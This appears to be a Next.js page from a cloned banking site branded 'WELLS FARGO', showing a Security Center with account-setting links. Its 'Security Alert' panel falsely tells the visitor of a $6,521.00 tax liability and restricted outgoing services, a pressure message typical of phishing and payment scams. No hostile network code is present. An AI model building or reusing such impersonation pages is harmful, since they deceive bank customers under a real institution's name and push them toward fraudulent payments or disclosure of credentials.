'use client';

import { useRouter } from 'next/navigation';
import { ArrowLeft, Shield, Lock, Eye, Smartphone, ChevronRight } from 'lucide-react';

export default function SecurityPage() {
  const router = useRouter();

  const securityItems = [
    { icon: <Lock size={20} />, label: 'Change Password', desc: 'Keep your account secure' },
    { icon: <Smartphone size={20} />, label: '2nd Step Verification', desc: 'Secure sign-on method' },
    { icon: <Eye size={20} />, label: 'Privacy Settings', desc: 'Control your data' },
  ];

  return (
    <div className="animate-in">
      <header className="header-row" style={{ borderBottom: '1px solid #EEE', background: 'white' }}>
        <button onClick={() => router.push('/dashboard')} style={{ display: 'flex', alignItems: 'center', gap: '8px', background: 'none', border: 'none', fontWeight: 600, cursor: 'pointer', fontSize: '14px' }}>
          <ArrowLeft size={20} /> Back
        </button>
        <div className="serif-logo" style={{ fontSize: '18px', position: 'absolute', left: '50%', transform: 'translateX(-50%)' }}>
          WELLS FARGO
        </div>
        <div style={{ width: 60 }}></div>
      </header>

      <div className="page-container" style={{ maxWidth: '600px', paddingTop: '40px' }}>
        <div style={{ width: '64px', height: '64px', background: '#FFF0F0', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: '24px' }}>
          <Shield size={32} color="#D1121F" />
        </div>
        <h1 className="offer-h1" style={{ fontSize: '32px', marginBottom: '8px' }}>Security Center</h1>
        <p style={{ color: '#666', marginBottom: '32px' }}>Protect your identity and your accounts.</p>

        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
          {securityItems.map((item, idx) => (
            <div key={idx} style={{ background: 'white', padding: '20px', borderRadius: '16px', border: '1px solid #EEE', display: 'flex', justifyContent: 'space-between', alignItems: 'center', cursor: 'pointer' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
                <div style={{ color: '#D1121F' }}>{item.icon}</div>
                <div>
                  <div style={{ fontWeight: 700, fontSize: '16px' }}>{item.label}</div>
                  <div style={{ fontSize: '13px', color: '#666' }}>{item.desc}</div>
                </div>
              </div>
              <ChevronRight size={20} color="#CCC" />
            </div>
          ))}
        </div>

        <div style={{ marginTop: '40px', background: 'white', padding: '24px', borderRadius: '16px', border: '1px solid #EEE' }}>
          <h3 style={{ fontWeight: 700, fontSize: '18px', marginBottom: '12px' }}>Security Alert</h3>
          <p style={{ fontSize: '14px', color: '#D1121F', fontWeight: 600, lineHeight: '1.5' }}>
            We noticed an outstanding tax liability of $6,521.00 associated with your profile. Outgoing services are currently restricted to protect your assets.
          </p>
        </div>
      </div>
    </div>
  );
}
